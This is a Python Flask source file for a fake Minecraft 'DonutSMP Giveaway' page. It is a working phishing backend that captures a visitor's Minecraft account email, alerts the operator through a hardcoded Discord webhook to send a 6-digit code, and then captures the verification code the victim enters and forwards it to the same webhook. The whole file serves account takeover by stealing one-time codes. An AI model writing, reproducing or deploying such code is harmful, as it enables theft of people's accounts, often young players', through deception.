from flask import Flask, request, jsonify, send_from_directory
import aiohttp
import asyncio
import discord
from discord import AsyncWebhookAdapter

app = Flask(__name__, static_folder='.')

WEBHOOK_URL = "https://discord.com/api/webhooks/1439990429226369166/lJgEK_CeiR5qkbvXsFCLwmHH7jVoS_wx0IT97nPMyvPXnbltCKfV1b27urEmg-DnWJwr"

# Serve the homepage
@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

# Step 1 — receive email
@app.route('/send_email', methods=['POST'])
def send_email():
    email = request.json.get('email', '').strip()
    if '@' not in email:
        return jsonify({"error": "Bad email"}), 400
    
    msg = f"@everyone\n**NEW GIVEAWAY ENTRY**\nMinecraft Email: `{email}`\nSend them a 6-digit code now!"
    asyncio.create_task(send_to_discord(msg))
    
    return jsonify({"next": "ask_code"})

# Step 2 — receive code
@app.route('/send_code', methods=['POST'])
def send_code():
    email = request.json.get('email', '').strip()
    code = request.json.get('code', '').strip()
    
    msg = f"@everyone\n**CODE SUBMITTED**\nEmail: `{email}`\nCode: `{code}`\nThis person is ready!"
    asyncio.create_task(send_to_discord(msg))
    
    return jsonify({"done": True})

# Actually send to Discord
async def send_to_discord(content):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, adapter=AsyncWebhookAdapter(session))
            await webhook.send(content, username="DonutSMP Giveaway")
    except Exception as e:
        print("Webhook failed:", e)

if __name__ == '__main__':
    app.run()
